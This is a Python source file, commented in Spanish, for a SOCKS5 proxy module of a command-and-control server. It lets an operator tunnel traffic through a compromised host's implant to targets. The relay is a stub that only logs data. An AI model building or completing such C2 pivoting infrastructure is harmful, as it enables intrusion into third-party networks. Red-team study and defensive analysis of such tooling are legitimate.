"""Servidor SOCKS5 local para el C2 server.

Permite al operador conectarse vía SOCKS5 y que el tráfico
se encamine a través del implant al objetivo final.
"""
import socket
import struct
import threading
import time
import logging

log = logging.getLogger("c2.socks")


# SOCKS5 constants
SOCKS5_VERSION = 0x05
SOCKS5_AUTH_NONE = 0x00
SOCKS5_CMD_CONNECT = 0x01
SOCKS5_ATYP_IPV4 = 0x01
SOCKS5_ATYP_DOMAIN = 0x03
SOCKS5_ATYP_IPV6 = 0x04
SOCKS5_REP_OK = 0x00
SOCKS5_REP_CONN_REFUSED = 0x05


class SOCKSServer:
    """Servidor SOCKS5 que encamina tráfico a través del canal C2."""

    def __init__(self, host="127.0.0.1", port=1080):
        self.host = host
        self.port = port
        self.server_socket = None
        self.running = False
        self.channels = {}  # channel_id -> client_socket
        self.lock = threading.Lock()

    def start(self):
        """Inicia el servidor SOCKS5."""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        self.running = True

        log.info(f"SOCKS5 server listening on {self.host}:{self.port}")

        # Aceptar conexiones en thread separado
        self.thread = threading.Thread(target=self._accept_connections, daemon=True)
        self.thread.start()

    def _accept_connections(self):
        """Acepta conexiones SOCKS5 de clientes (operadores)."""
        while self.running:
            try:
                client_socket, addr = self.server_socket.accept()
                log.info(f"SOCKS5 connection from {addr}")

                # Manejar cada conexión en thread separado
                handler = threading.Thread(
                    target=self._handle_client,
                    args=(client_socket,),
                    daemon=True
                )
                handler.start()
            except OSError:
                break

    def _handle_client(self, client_socket):
        """Maneja una conexión SOCKS5 de un cliente."""
        try:
            # Handshake SOCKS5
            data = client_socket.recv(256)
            if not data or data[0] != SOCKS5_VERSION:
                client_socket.close()
                return

            # Responder: sin autenticación
            client_socket.sendall(struct.pack("!BB", SOCKS5_VERSION, SOCKS5_AUTH_NONE))

            # Recibir solicitud
            data = client_socket.recv(256)
            if not data or len(data) < 4:
                client_socket.close()
                return

            command = data[1]
            atyp = data[3]

            # Parsear dirección
            if atyp == SOCKS5_ATYP_IPV4:
                addr = socket.inet_ntoa(data[4:8])
                port = struct.unpack("!H", data[8:10])[0]
            elif atyp == SOCKS5_ATYP_DOMAIN:
                domain_len = data[4]
                addr = data[5:5 + domain_len].decode()
                port = struct.unpack("!H", data[5 + domain_len:7 + domain_len])[0]
            elif atyp == SOCKS5_ATYP_IPV6:
                addr = socket.inet_ntop(socket.AF_INET6, data[4:20])
                port = struct.unpack("!H", data[20:22])[0]
            else:
                self._send_error(client_socket, SOCKS5_REP_CONN_REFUSED)
                return

            target = f"{addr}:{port}"
            log.info(f"SOCKS5 CONNECT request to {target}")

            # Generar channel_id único
            channel_id = f"socks_{int(time.time() * 1000)}"

            # Almacenar canal
            with self.lock:
                self.channels[channel_id] = {
                    "client_socket": client_socket,
                    "target": target,
                    "created": time.time()
                }

            # Responder éxito (el tráfico real se maneja vía C2)
            reply = struct.pack("!BBBB", SOCKS5_VERSION, SOCKS5_REP_OK, 0x00, SOCKS5_ATYP_IPV4)
            reply += socket.inet_aton("0.0.0.0") + struct.pack("!H", 0)
            client_socket.sendall(reply)

            # Mantener conexión y relay de datos
            self._relay_loop(client_socket, channel_id)

        except Exception as e:
            log.error(f"SOCKS5 client error: {e}")
        finally:
            self._cleanup_channel(channel_id if 'channel_id' in locals() else None)
            client_socket.close()

    def _relay_loop(self, client_socket, channel_id):
        """Loop de relay de datos entre cliente y canal C2."""
        client_socket.settimeout(0.5)

        while self.running:
            try:
                data = client_socket.recv(65536)
                if not data:
                    break
                # Aquí se enviarían los datos al implant vía C2
                # Por ahora solo logueamos
                log.debug(f"SOCKS5 relay {channel_id}: {len(data)} bytes")
            except socket.timeout:
                continue
            except socket.error:
                break

    def _send_error(self, client_socket, error_code):
        """Envía respuesta de error SOCKS5."""
        reply = struct.pack("!BBBB", SOCKS5_VERSION, error_code, 0x00, SOCKS5_ATYP_IPV4)
        reply += socket.inet_aton("0.0.0.0") + struct.pack("!H", 0)
        client_socket.sendall(reply)

    def _cleanup_channel(self, channel_id):
        """Limpia un canal SOCKS."""
        if channel_id:
            with self.lock:
                if channel_id in self.channels:
                    del self.channels[channel_id]

    def stop(self):
        """Detiene el servidor SOCKS5."""
        self.running = False
        if self.server_socket:
            self.server_socket.close()

        # Cerrar todos los canales
        with self.lock:
            for channel_id, channel in self.channels.items():
                try:
                    channel["client_socket"].close()
                except:
                    pass
            self.channels.clear()


# Instancia global del servidor SOCKS
socks_server = SOCKSServer()
